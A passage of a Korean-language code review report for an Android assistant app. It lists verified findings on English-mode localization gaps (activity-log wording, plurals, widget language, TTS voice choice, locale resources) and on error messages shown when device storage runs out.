- 왜: 한국어 화면은 0.38.5~0.38.7 에 '모델에게 하는 말은 빼고 해요체로' 다듬었는데 영어 화면은 같은 수준이 아니다. 영어로 쓰는 사람이 활동 기록을 펼치면 "Confirm the value with the user and call the tool again." 같은 모델용 지시와 start_time 같은 내부 이름, 한국어 참고 문구("같은 차례의 추가 호출 2건 미실행…")를 본다. 활동 기록(해시 체인)은 포트폴리오에서 내세우는 기능이라 영어 시연 때 약점이 된다. 실사용(한국어)에는 영향 없음.
- 제안: 표시 쪽만 고친다(기록 원문·툴 결과 문구는 그대로라 모델 입력 변화 없음). ① 영어용 다듬기 표를 추가: 인자 오류 3종 → "A required value was missing." 등, "Not executed."/"Not saved." 뒤의 지시 문장 제거. ② TO_MODEL_EN 을 문장 첫 낱말 고정에서 '모델에게 시키는 동사(confirm/answer/add … again/send it again/clearly tell/be sure to/only report/ask the user)가 든 명령문'으로 넓히고 AuditLabelsTest 에 위 실제 문구들을 표로 고정. ③ 참고(note)·오류 한국어 고정 문구는 상수 키로 기록하고 화면에서 strings.xml 로 바꾸거나, 최소한 영어 대응을 AuditLabels 에 둔다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/settings/AuditLabels.kt:196-197 — 영어면 toolMessageKorean(말투 다듬기 표)을 건너뛰고 readable() 결과를 그대로 쓴다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/settings/AuditLabels.kt:298-314 — 다듬기 표(TOOL_MESSAGES)는 한국어 문구 14개뿐, 영어 대응 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/settings/AuditLabels.kt:325 — TO_MODEL_EN 은 문장이 tell/ask/do not/call… 로 '시작'할 때만 지시로 보고 뺀다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:536, 539, 545 — "Argument 'start_time' is missing. Confirm the value with the user and call the tool again." / "Send it again as a string." : Confirm·Send 로 시작해 걸러지지 않고 인자 이름도 노출
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddMemoryToolExecutor.kt:72 — "Clearly tell the user it was not saved…" (Clearly 로 시작), domain/.../agent/ScheduleWeekdayIntent.kt:92 "Add the event again with that date.", app/.../agent/ToolCallGuards.kt:87 "Answer with that value and do not claim you saved it."
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:240, 366, 582 및 assistant/orchestrator/AssistantOrchestrator.kt:88, 136 — 감사 기록의 참고·오류 문구가 한국어 고정이고 AuditLabels.kt:176(참고 칸 원문 그대로)·240(한글이 있으면 그대로)이 영어 화면에 그대로 보여 준다
- 검증: 주장이 맞다. AuditLabels.kt:196-197 은 영어면 toolMessageKorean 을 건너뛰고 readable() 결과만 쓴다. 298-314행 다듬기 표는 한국어 14개뿐이다. 325행 TO_MODEL_EN 은 '^(please )?(tell|inform|ask|do not|don't|call|use|respond|reply|never)' 로 문장 첫 낱말에 고정돼 있어 다음 문장이 걸러지지 않는다: BaseAgent.kt:536 'Confirm the value with the user and call the tool again.'(앞 문장의 인자 이름도 노출), 539행 'Send it again as a string.', 545행 'Send it again in the format …', AddMemoryToolExecutor.kt:72 'Clearly tell the user …', ScheduleWeekdayIntent.kt:92 'Add the event again with that date.', ToolCallGuards.kt:90 REPEAT_NOT_SAVE_EN 'Answer with that value and do not claim you saved it.'(제안은 87행이라 했으나 실제는 90행). 참고 칸은 176행에서 원문 그대로이고 BaseAgent.kt:240 의 한국어 고정 문구가 그대로 나온다. 오류는 AuditLabels.kt:240 에서 한글이 있으면 그대로이며 BaseAgent.kt:366·AssistantOrchestrator.kt:88 이 한국어 고정이다. AuditLabelsTest.kt:157-171 의 영어 테스트는 지시 문장이 없는 깨끗한 문구 하나만 다룬다. 표시 쪽만 고치면 모델 입력 변화는 없다. 실사용(한국어)에는 영향이 없어 낮음.
- 앞선 기록: CHANGELOG 0.38.4 M2 결정 5(715행), 0.38.5 M1, 0.38.7 결정 4 — 한국어 표시 다듬기만 기록됨. 영어 화면의 지시문 거르기 수준에 대한 결정 기록은 없음.

### gap-english-4 · 0.40.0 이 남긴 영어 모드 실기기 확인 3건(영어 낭독, 시스템 설정에서 앱 언어 변경, 위젯 한/영 갱신)이 확인 목록 문서로 옮겨지지 않아 미확인 상태
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: AGENTS 규칙상 화면 셸을 바꾼 회차의 실기기 목록은 남겨서 닫아야 하는데, 이 세 건은 CHANGELOG 한 줄로만 남아 추적에서 빠졌다. 세 건 모두 JVM 테스트가 못 보는 자리이고(TTS 엔진, 시스템 설정 경로의 onConfigurationChanged, Glance 위젯), 이 보고의 1·5·6번 항목이 바로 이 자리의 위험이다.
- 제안: device_gate.md 에 '영어 모드' 묶음으로 세 항목을 옮기고, 휴대폰 시간을 쓰지 않도록 에뮬레이터(my_phone, API 35)에서 먼저 닫는다: ② `cmd locale set-app-locales` 또는 시스템 설정으로 바꿔 채팅 답 언어·알림 채널·위젯이 따라오는지, ③ 앱 안 토글 직후 위젯 라벨과 날짜가 같은 언어인지, ① 구글 엔진 영어 음성으로 영어 답 낭독과 한국어 답 낭독(1번 항목 재현). 삼성 엔진 고유 동작만 휴대폰 최종 확인으로 남긴다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md:589 — "실기기 확인 목록(사용자 몫) — ① 영어 모드에서 TTS 음성 읽기 버튼 동작 ② 시스템 설정 › 애플리케이션 언어에서 바꿨을 때 동기화 ③ 홈 위젯의 한/영 표시 갱신"
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/checklists/device_gate.md:44-46 — 음성 출력 항목은 한국어 낭독만 있고 미체크, 문서 전체에 위 세 항목 없음(영어 관련은 304·336·358·359행의 다른 항목뿐)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md:586 — 실기기에서 확인된 것은 앱 안 토글 전환·알림 채널 이름·4턴 영어 대화까지
- 검증: 주장이 맞다. docs/CHANGELOG.md:589 에 ① 영어 모드 낭독 ② 시스템 설정의 앱 언어 변경 동기화 ③ 홈 위젯 한/영 갱신이 사용자 몫으로 남아 있고, 586행 실기기 확인은 앱 안 토글·알림 채널 이름·4턴 영어 대화까지만 적혀 있다. docs/checklists/device_gate.md 를 grep 하면 낭독 항목은 44-46행(한국어 낭독·엔진 전환, 미체크)뿐이고 영어 관련은 304·336·358·359행의 다른 항목뿐이라 세 건은 옮겨져 있지 않다. 문서 정리 수준이라 낮음. 에뮬레이터에서 먼저 닫자는 제안은 '재현·진단은 에뮬레이터' 원칙과 맞는다.
- 앞선 기록: CHANGELOG 0.40.0 589행 '실기기 확인 목록(사용자 몫)' 3건, docs/plans/0.40.1-refactoring.md:70 '알림 채널·위젯·타일 문구가 한/영 리소스를 반영하는지' 확인 항목.

### gap-english-5 · 영어 음성 선택이 나라 구분 없이 '품질 최고 중 아무거나'라 억양이 실행마다 달라질 수 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 한국어는 ko-KR 하나라 문제가 없지만, 영어는 엔진에 미국·영국·인도·호주 등 여러 나라 음성이 같은 품질 등급으로 설치돼 있는 것이 보통이다. 동점일 때 Set 순회 순서로 정해져 어떤 날은 미국식, 어떤 날은 다른 억양으로 읽을 수 있다. 영어 모드에서만 생기는 비대칭이고, 실제 엔진의 음성 목록은 기기에서 확인하지 못했다.
- 제안: 선택 기준을 명시한다: ① 기기 기본 로케일의 나라와 같은 음성 → ② en-US → ③ 그 밖, 같은 묶음 안에서는 품질 높은 순, 마지막 동점은 voice.name 사전순으로 고정. 순수 함수(pickVoice(voices, lang, deviceLocale))로 빼서 표 테스트를 붙인다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:186-189 — engine.voices(순서 없는 Set)에서 locale.language == "en" 인 오프라인 음성 전부를 모아 maxByOrNull { quality } 하나를 고른다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/test/java/com/kosmos/app/platform/speech/SpeechOutputTest.kt:92 — 테스트는 영어 음성이 하나(Locale.US)인 경우만 다룬다
- 검증: 맞는 부분: SpeechOutput.kt:186-189 는 locale.language 만 비교하고 나라 구분 없이 maxByOrNull { quality } 로 하나를 고른다. 동점 처리 기준이 없고, SpeechOutputTest.kt:86-92 는 영어 음성이 Locale.US 하나인 경우만 다룬다. 따라서 미국식이 아닌 억양이 뽑힐 수 있다는 점은 성립한다. 과장된 부분: '실행마다 달라진다'는 근거가 없다. maxByOrNull 은 순회 순서상 첫 최댓값을 돌려주므로 결과는 engine.voices 가 돌려주는 Set 의 순회 순서에 달려 있는데, 그 순서가 실행마다 바뀐다는 증거는 코드에 없다. 내 추정으로는 같은 음성 목록이면 순서도 같아서, 음성이 추가·삭제될 때만 바뀔 가능성이 높다. 실제 엔진의 영어 음성 목록과 품질 등급 동점 여부도 기기에서 확인되지 않았다. 순수 함수로 빼서 기준을 고정하는 제안 자체는 작고 무해하지만 우선순위는 가장 낮다.

### gap-english-6 · 앱 안에서 언어를 바꾼 직후 위젯이 날짜는 새 언어, 라벨은 옛 언어로 섞여 그려질 수 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 알림 채널에서 이미 겪어 고친 '구성 반영 시점' 문제가 위젯에는 그대로 남아 있다. 섞여 그려지면 다음 갱신(일정·할 일 변경 또는 30분 주기)까지 "Friday, Nov 20" 아래 "할 일 3건" 같은 화면이 홈에 남는다. 스스로 풀리는 문제라 심각도는 낮고, 실제로 섞이는지는 타이밍에 달려 있어 확인하지 못했다(추정).
- 제안: WidgetContent 가 문자열을 꺼낼 때 snapshot.lang 으로 로케일을 명시한 컨텍스트(context.createConfigurationContext)를 쓰게 해 날짜와 라벨의 언어 출처를 하나로 맞춘다(알림 채널과 같은 방식). WidgetSnapshotTest 에 '컨텍스트는 ko, lang 은 EN' 경우를 더한다. 4번 항목의 에뮬레이터 확인 ③으로 재현 여부를 먼저 본다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/core/config/AppLanguageHolder.kt:111-122, 168-176 — setOption 이 applicationLocales 를 넣자마자(시스템의 구성 변경이 도착하기 전) 위젯 refresh() 를 띄운다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/widget/KosmosWidget.kt:77, 82 — 날짜·시각은 appLanguageHolder().current(이미 새 언어)로 만든다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/widget/KosmosWidget.kt:104-173 — "오늘"·"할 일 N건"·"열기" 등은 LocalContext 의 getString(구성 변경이 반영돼야 새 언어)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/notification/NotificationChannels.kt:37-43 — 같은 시점 문제를 알림 채널은 createConfigurationContext 로 로케일을 명시해 피했다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/core/config/AppLanguageHolder.kt:169-171 — 뒤늦게 onConfigurationChanged 가 와도 prev == newLang 이라 위젯을 다시 그리지 않는다
- 검증: 코드 사실은 맞다. AppLanguageHolder.kt:104-123 setOption 은 116행에서 applicationLocales 를 넣은 직후 122행 updateResolvedLanguage 를 부르고, 175-176행에서 위젯 refresh()(WidgetRefresher.kt:45 updateAll)를 띄운다. KosmosWidget.kt:77·82 는 날짜 쪽 언어를 appLanguageHolder().current 로, 104-173행 라벨은 LocalContext 의 getString 으로 꺼내 언어 출처가 둘이다. 뒤늦게 onConfigurationChanged(87-101행)가 와도 171행 prev != newLang 조건 때문에 다시 그리지 않는다. NotificationChannels.kt:37-43 은 같은 문제를 createConfigurationContext 로 피했다. 확인되지 않은 부분: 실제로 섞여 그려지는지는 '앱 컨텍스트의 리소스 구성이 갱신되는 시점'과 '위젯 그리기 작업이 도는 시점'의 경합에 달려 있고, 위젯에 넘어오는 컨텍스트가 어느 시점의 구성을 보는지는 코드만으로 판정할 수 없다. 제안자도 추정이라고 밝혔다. 0.40.0 실기기 확인 ①은 설정·채팅 화면만 봤고 위젯은 보지 않았다. 그래서 '위험 후보'까지만 인정한다. 고친다면 snapshot.lang 으로 로케일을 명시한 컨텍스트를 쓰는 방식이 알림 채널과 같아 일관되지만, 에뮬레이터에서 재현 여부를 먼저 보는 것이 순서다.
- 앞선 기록: docs/plans/0.40.0-english-mode.md:107 '언어가 바뀌면 위젯을 Glance updateAll 로 다시 그린다', CHANGELOG 0.40.1(알림 채널은 createConfigurationContext 로 로케일 명시), CHANGELOG 0.40.0 589행 실기기 확인 ③ 위젯 한/영 갱신(미확인).

### gap-english-7 · 영어 문자열: 단수·복수 구분이 없고("1 events today, 1 pending tasks"), 화면 이름·'호칭' 번역이 어긋난 곳이 있다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 두 파일의 키·자리표시자 개수와 순서는 전부 일치했고(키 차이는 번역 제외 3개뿐), 뜻이 뒤집힌 번역도 없었다. 남은 것은 다듬기 수준이지만, 아침 브리핑 알림은 영어 사용자가 매일 보는 문구이고 오류 문구가 가리키는 메뉴 이름이 화면과 다르면 찾아가지 못한다. 포트폴리오 스크린샷에서 눈에 띄는 종류다.
- 제안: ① 숫자가 문장 주어인 문자열을 plurals 로(알림은 일정·할 일 두 조각으로 나눠 조립): notif_briefing_counts, cleanup_done_merged_count, cleanup_done_episodes_merged, doc_library_semantic_pending, model_mgmt_embedding_memory_pending, audit_chain_legacy, calendar_month_cell_events_suffix. 한국어 쪽은 other 하나만 둔다. ② ErrorMessages 영어 2곳을 "Settings > Model Management"로. ③ '호칭'은 "preferred name"(466행은 "profile suggestions")으로 통일 — settings_reset_opt_profile_detail 은 이미 "preferred name"을 쓴다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res/values-en/strings.xml:400 — notif_briefing_counts "%1$d events today, %2$d pending tasks" (매일 아침 알림 본문, 1건이면 "1 events")
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res/values-en/strings.xml:324, 355, 502, 578 — "Merged %1$d memories.", "%1$d documents aren't ready…", "%1$d memories aren't ready…", "Saved %1$s notes, %2$s profile suggestions" — plurals 리소스는 두 파일 모두 0개
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:77, 79 — 영어 오류 문구는 "Settings > Manage Model", 실제 화면 이름은 values-en/strings.xml:486 "Model Management"(58행 스플래시 문구도 Model Management) — 한국어는 "모델 관리"로 일치
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res/values-en/strings.xml:466, 238, 448 — '호칭'을 "title"로 옮김: "title suggestions"(실제 뜻은 프로필 제안), "Name, title, tone, job", "names or titles"
- 검증: 전부 확인됐다. plurals 리소스는 values/strings.xml·values-en/strings.xml 모두 0개다. values-en/strings.xml:400 notif_briefing_counts '%1$d events today, %2$d pending tasks' 는 BriefingNotifier.kt:40 에서 매일 아침 알림 본문에 쓰여 1건이면 '1 events'가 된다. 324행 'Merged %1$d memories.', 326행, 355행, 502행, 537행, 265행도 같은 모양이다. ErrorMessages.kt:77·79 는 'Settings > Manage Model' 인데 실제 화면 이름은 values-en/strings.xml:486 'Model Management'(58행 스플래시 문구도 같음)라 어긋난다. '호칭'은 238행 'Name, title, tone, job', 448행 'names or titles', 466행 'title suggestions' 로 옮겨져 있다. 다듬기 수준이라 낮음. 이 중 실제로 사용자가 길을 잃을 수 있는 것은 ErrorMessages 의 메뉴 이름 2곳이고, 눈에 가장 자주 띄는 것은 아침 알림 복수형이다. 이 문자열들은 화면·알림 문구이고 모델 입력이 아니다.
- 앞선 기록: CHANGELOG 0.40.1(strings.xml 전환·MissingTranslation 오류 등급). 복수형·메뉴 이름 불일치·'호칭' 번역에 대한 기록은 CHANGELOG·architecture·plans 에 없음.

### gap-english-8 · 앱에 한국어 전용 리소스 폴더가 없어 '한국어 선택'이 의존 라이브러리의 한국어 번역에 기대어 동작한다 (언어 판정 출처도 세 갈래)
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 안드로이드는 언어 목록을 앞에서부터 '그 언어 리소스가 앱에 있는지'로 맞춰 보고, 하나도 없을 때만 표시 없는 기본 폴더를 쓴다. 지금은 라이브러리가 ko 리소스를 갖고 있어 ko 가 '있는 언어'로 잡히고 문자열은 기본(한국어)으로 떨어져 정상이다. 그러나 릴리스 준비에서 리소스 언어를 줄이는 설정을 잘못 넣거나 의존성 구성이 바뀌어 ko 가 빠지면, 언어 목록이 [한국어, English] 인 기기나 영어 기기에서 앱 언어를 '한국어'로 고른 경우 화면은 영어로 나오고 AppLanguageHolder 는 KO(프롬프트·날짜·낭독은 한국어)라 둘이 갈린다. 안드로이드 동작에 대한 판단은 기억에 근거한 것이라 확신도는 낮다. 지금 당장의 결함은 아니고 포트폴리오 단계(릴리스 빌드 전환) 때 밟을 수 있는 자리.
- 제안: 릴리스 전환 회차에 함께: ① app/build.gradle.kts 에 지원 언어를 명시(androidResources.localeFilters 에 ko·en)하고, 기본 폴더가 한국어임을 선언(res/resources.properties 의 unqualifiedResLocale=ko)하거나 앱 자체의 values-ko 표지 리소스를 하나 둔다. ② Robolectric 으로 '기기 언어 목록 ko,en → 한국어 문자열', '앱 언어 ko + 기기 en → 한국어 문자열' 두 경우를 고정. ③ 언어 판정 도우미를 하나(Configuration → AppLanguage)로 모아 Theme·AuditLabels·WidgetSnapshot·AppLanguageHolder 가 같이 쓰게 한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res — values(한국어, 언어 표시 없음)·values-en·values-night 만 있고 values-ko 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/build/intermediates/merged_res/debug/mergeDebugResources/values-ko_values-ko.arsc.flat — 합쳐진 결과의 values-ko 는 라이브러리(Compose·Material 등)에서만 온다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/build.gradle.kts — localeFilters/resourceConfigurations/generateLocaleConfig 설정 없음(grep 0건), res/xml/locales_config.xml 은 ko·en 을 직접 선언
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/core/config/AppLanguageHolder.kt:94, 109, 132 — 언어 판정이 newConfig.locales[0] / 시스템 로케일 목록 / context.resources.configuration 세 가지로 갈리고, 화면은 ui/theme/Theme.kt:198-202(LocalConfiguration), 활동 기록은 feature/settings/AuditLabels.kt:73-77, 위젯 기본값은 widget/WidgetSnapshot.kt:37-41 이 각자 다시 계산
- 검증: 사실 부분은 맞다. app/src/main/res 에는 values·values-en·values-night 만 있고 values-ko 가 없다. res/xml/locales_config.xml 은 ko·en 을 직접 선언한다. app/build.gradle.kts 에 localeFilters·resourceConfigurations·generateLocaleConfig 는 0건이고, 빌드 산출물에 values-ko_values-ko.arsc.flat 이 있는데 앱 소스에는 values-ko 가 없으니 라이브러리에서 온 것이다. 언어 판정도 AppLanguageHolder.kt:94·109·132, Theme.kt:198-202, AuditLabels.kt:73-77, WidgetSnapshot.kt:37-41 로 흩어져 있고 빈 목록일 때 기본값이 서로 다르다(Theme·WidgetSnapshot 은 Locale.KOREAN, AuditLabels 는 Locale.getDefault()). 다만 지금 결함은 아니고 가정에 가정을 얹은 위험이다: ① 현재 빌드는 ko 리소스가 들어 있어 정상 동작한다. ② 제안이 권하는 localeFilters 에 ko·en 을 넣는 경우에도 라이브러리의 ko 리소스는 남으므로, 실제로 밟으려면 ko 를 빼는 잘못된 설정이 있어야 한다. ③ 안드로이드 리소스 선택 동작에 대한 판단은 제안자·검증자 모두 기억에 근거했고 이 저장소에서 확인된 것이 아니다. 릴리스 빌드 전환은 보류된 단계이므로 그 회차의 점검 항목 한 줄로 넘기면 충분하다. 언어 판정 도우미 통합은 별개의 작은 정리 거리로는 타당하다.
- 앞선 기록: ADR-033 결정 1(LocaleManager 정본, locales_config.xml 에 ko·en 등록). values-ko 부재·unqualifiedResLocale·localeFilters 에 대한 기록은 CHANGELOG·architecture·plans 어디에도 없음(grep 0건).

<details><summary>읽은 범위</summary>

[직접 끝까지 읽은 것] AppLanguageHolder.kt(184줄 전부), core 의 AppLanguage·CurrentLanguage, IsoDateTimeParser.kt 전부, GenerateBriefingUseCase.kt·MorningBriefingGenerator.kt 전부, platform/notification 의 BriefingNotifier·ReminderNotifier·NotificationChannels, platform/alarm/ReminderFireHandler, work/BriefingNotificationWorker, widget/WidgetSnapshot·WidgetRefresher(KosmosWidget 은 provideGlance 와 문자열 사용부), platform/speech/SpeakableText·SpeechOutput 전부, TranscribeAudioUseCase 전부, feature/settings/AuditLabels.kt 전부, ErrorMessages·ContentLanguage·RejectionReplies·RefusalTurns·MemoSaveIntent(앞 110줄)·RecallConflict(앞부분)·GenerateWeeklyReviewUseCase·EpisodeMerge(판정부)·EpisodeTranscript·AttachedDocumentBlock·OneShotLimits(BrokenOutput), ADR-033 본문, CHANGELOG 0.40.0~0.40.2 관련 줄.
[문자열 대조] values/strings.xml 과 values-en/strings.xml 을 키 기준으로 붙여 548쌍 전부 읽었다. 키 차이는 번역 제외 3개(app_name, lang_option_ko/en)뿐, 자리표시자 종류·개수·번호 차이 0건, 뜻이 뒤집힌 번역 0건, plurals 는 양쪽 0개.
[한글 리터럴 전수 grep] app/src/main/java 와 domain·data·core 의 src/main 을 주석·로그 줄 빼고 훑었다. 화면·알림·위젯·낭독으로 나가는 자리는 거의 모두 한/영 분기가 있었고, 남은 것은 활동 기록에만 보이는 문구(3번 항목)였다. IsoDateTimeParser 를 lang 없이 부르는 운영 호출부는 0건(ScheduleWeekdayIntent.kt:94 는 한국어 분기 안, EpisodeMerge.kt:129·GenerateWeeklyReviewUseCase.kt:64 는 영어 분기 안에서 EN 고정).
[확인했고 문제없다고 본 것] 예약된 알림·브리핑 알림은 울리는 순간에 문구를 만들어 언어 전환을 따라간다(저장된 것은 작업 id 뿐). 프로세스 재시작 시 KosmosApp.onCreate 가 워커·수신기보다 먼저 언어를 맞춘다. 언어 변경 시 대화 미리 준비는 엔진이 준비 상태일 때만 돈다(GemmaModelRunner.kt:434) — 백그라운드 모델 로드 아님. API 32 이하는 토글을 숨겨 둔 기록된 결정. 가드·거절 문장·첨부 문서 머리말은 저장된 두 언어를 모두 알아본다.
[실행하지 않은 것] gradle·adb·파이썬·테스트는 규칙대로 실행하지 않았다. 그래서 TTS 엔진이 한글을 영어 음성으로 어떻게 읽는지(1번), 영어 음성 목록의 실제 구성(5번), 위젯 섞임의 실제 발생(6번), 안드로이드 리소스 해석(8번)은 코드와 기억에 근거한 추정이며 confidence 를 medium/low 로 낮췄다. 그래프 도구는 쓰지 않고 grep·파일 읽기만 썼다. 시스템 지시·툴 선언(PromptAssembler 뒷부분, KosmosToolDeclarations)은 모델 입력이라 언어 분기 유무만 보고 문구 평가는 하지 않았다. 사용 안내 문서(USER_GUIDE.en.md)는 이미 나온 항목이라 읽지 않았다.
[버린 것 4건] ① 주간 돌아보기가 설정 언어를 따르면서 검색되는 메모로 저장되는 점 — ADR-033 결정 5 에 일부러 그렇게 둔다고 적혀 있어 뺐다(영어 설정에서는 깨진 출력 거르기도 건너뛰는데 이것도 CHANGELOG 0.42.4 에 알려진 한계). ② 언어 전환 직후 앞 언어 끌림 — CHANGELOG 0.40.0 사용자 결정으로 한계 처리. ③ 스프레드시트 색인 제목 "시트: 이름"(LibraryChunker.kt:88)이 한국어 고정 — 모델 입력이고 영향이 미미. ④ 위젯 고르기 화면·런처의 앱 이름표가 기기 언어를 따르는 것 — 안드로이드 제약이라 고칠 수 없음. 10건을 넘겨 자른 것은 없다(총 8건).

</details>

## 오류 종류 → 사용자 문구 전수와 실패 뒤 복구 길 (gap-errors)

### gap-errors-1 · 저장 공간이 찼을 때 화면마다 엉뚱한 원인이 나온다 (저장 실패·파일 손상·권한 만료·백업 파일 문제)
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 3.6GB 모델을 넣고 매일 쓰는 휴대폰에서 저장 공간이 바닥나는 것은 현실적인 상황이다. 그때 채팅은 "저장에 실패했어요. 다시 시도해 주세요"만 되풀이하고, 문서는 "손상", 보관함은 "권한 만료", 복원은 "백업 파일을 확인"이라고 나와 사용자가 엉뚱한 곳을 고치게 된다. "저장 공간이 부족해요" 문구와 오류 종류(InsufficientStorage)는 이미 있는데 두 곳에서만 쓰인다. 실사용에서 원인을 못 찾는 대표 사례이고, 면접에서 '오류를 종류로 나눴다'고 설명할 때 바로 반례가 된다.
- 제안: (1) DbCall.dbWrite 의 catch 에서 android.database.sqlite.SQLiteFullException(및 원인 사슬의 ENOSPC)을 따로 잡아 AppError.InsufficientStorage 로 올린다 — 문구는 이미 있다. (2) DocumentOpener.copyToCache 와 ExportImportManager 의 추출·교체 catch 에서 IOException 원인이 ENOSPC(android.system.ErrnoException.errno == OsConstants.ENOSPC)이거나 남은 공간이 필요한 크기보다 작으면 각각 새 DocumentError(예: NO_SPACE)·AppError.InsufficientStorage 로 돌린다. (3) 백업 사전 점검을 고정 10MB 대신 DB 파일 크기(+사이드카) 기준으로, 복원은 zip 크기의 몇 배를 기준으로 미리 본다. (4) LibraryIndexer 의 replaceChunks 실패는 OPEN_FAILED 가 아닌 별도 실패 종류로 둔다. 판정은 순수 함수로 빼서 JVM 테스트로 고정한다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/repository/DbCall.kt:28-36 — 모든 DB 쓰기 예외를 종류 구분 없이 DbWriteError(table) 로 바꾼다(저장 공간 부족 예외도 포함)
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:276 — DbWriteError 문구는 "저장에 실패했어요. 다시 시도해 주세요."
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:108-111 — 사용자 메시지 저장이 실패하면 그 오류만 돌려주고 턴을 끝낸다(공간이 찬 동안 채팅 전체가 같은 문구로 막힌다)
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:138-140, 231-254 — 문서를 캐시에 복사하다 난 IOException 은 전부 CORRUPT("파일이 손상됐거나 내용이 형식과 달라요")
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:115-118 — 보관함 조각 저장(DB 쓰기) 실패가 OPEN_FAILED → "권한이 만료됐거나 파일이 옮겨졌을 수 있어요"(DocumentHomeScreen.kt:301-303)
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:64-66 — 백업 만들기 전 점검이 DB 크기와 무관한 고정 10MB
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:125-135, 187-189 — 복원은 공간 점검이 없고 압축 풀다 난 예외는 ImportFailed → "복원에 실패했어요. 백업 파일을 확인해 주세요."
  - work/ModelDownloadWorker.kt:98-107 — InsufficientStorage 문구를 제대로 내는 곳은 모델 내려받기와 백업 사전 점검뿐
- 검증: 핵심 주장은 코드로 확인됨. DbCall.kt:28-36 은 모든 Exception 을 DbWriteError(table) 로 바꾼다(SQLiteFullException 구분 없음). AssistantOrchestrator.kt:108-111 은 사용자 메시지 저장 실패 시 그 오류만 돌려주고 끝낸다. DocumentOpener.kt:137-139 는 IOException 전부 CORRUPT, copyToCache(231-256)는 예외를 그대로 다시 던진다. ExportImportManager.kt:64-65 는 고정 10MB 점검, restoreFromZip(125-193)은 공간 점검이 없고 187-189 에서 ImportFailed 로 뭉친다. InsufficientStorage 생성처는 grep 결과 ModelDownloadWorker.kt:100, WorkManagerModelDownloadScheduler.kt:218, ExportImportManager.kt:65 세 곳뿐. 고칠 세부 두 가지: (1) 증거의 ErrorMessages.kt 줄 번호가 틀렸다 — 파일은 101줄이고 DB_WRITE_ERROR 문구는 52줄, INSUFFICIENT_STORAGE 는 59줄. (2) 보관함 조각 저장 실패(LibraryIndexer.kt:116-117)는 화면에 '권한이 만료됐거나…'가 아니라 '파일을 열 수 없어요.' 한 줄만 나온다 — DocumentHomeScreen.kt:301-303 이 lineSequence().first() 로 첫 줄만 쓴다(strings.xml:379). 원인과 다른 문구인 것은 같다. 저장 공간이 완전히 차야 나오는 상황이라 빈도는 낮다고 보아 중간으로 낮춤.
- 앞선 기록: CHANGELOG 1500·1612줄(모델 내려받기만 InsufficientStorage 로 구분), architecture.md 1297줄(내려받기 예외 분류). DB·문서·복원 경로의 저장 공간 부족에 대한 기록·결정은 찾지 못함

### gap-errors-2 · 입력이 너무 길면(8,192자 초과) 쓴 글이 사라지고, 보내지지 않은 말풍선이 보낸 것처럼 남는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 긴 글(기사·회의록)을 붙여 넣어 보내는 것은 실사용에서 흔하다. 지금은 스낵바가 "줄여서 다시 보내 주세요"라고 하는데 줄일 원문은 이미 입력란에서 지워졌고, 화면에는 그 글이 보낸 메시지처럼 남아 답만 안 오는 것으로 보인다. 앱을 다시 열면 그 말풍선은 사라진다(DB 에 없으므로). 문구가 권하는 행동이 실제로는 불가능한 경우다.
